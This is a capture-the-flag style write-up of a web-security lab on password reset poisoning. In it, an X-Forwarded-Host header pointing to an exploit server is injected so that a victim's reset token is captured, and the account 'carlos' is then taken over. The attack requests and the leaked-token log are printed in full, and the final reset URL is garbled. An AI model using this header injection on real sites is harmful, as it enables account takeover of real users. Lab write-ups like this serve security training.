# Password reset poisoning via middleware

**Request:**
The goal is to gain access to the user `carlos` which will carelessly clik on any links in email that he receives.

**Solution:**
Using Burp Suite I clicked on the **Forgot Password**, and observevd the request.

```http
POST /forgot-password HTTP/2
Host: 0adf005e033b58f480cd941600a70092.web-security-academy.net
...
Referer: https://0adf005e033b58f480cd941600a70092.web-security-academy.net/forgot-password
```

Having `Referer` here tells us that here we may also have the header `X-Forwarded-Host`.

So I added that with the value the URL of our exploit server.

```http
POST /forgot-password HTTP/2
Host: 0adf005e033b58f480cd941600a70092.web-security-academy.net
...
Referer: https://0adf005e033b58f480cd941600a70092.web-security-academy.net/forgot-password
X-Forwarded-Host: exploit-0aa800920395588b806593a9013b00ea.exploit-server.net/exploit
```

When sending this request, and looking onto our exploit server logs, I see the request with the token.

```http
GET /exploit/forgot-password?temp-forgot-password-token=69e303ffigq1m6fi75y8zzhk10dvc0lp HTTP/1.1
```

So I use this to the original URL, and it becomes:

```
https://0adf005e033b58f480cd941600a70092.web-security-academy.nethttps://0adf005e033b58f480cd941600a70092.web-security-academy.net/
```

Here I was prompted to give the new password, and it provided with the access to the user `carlos`.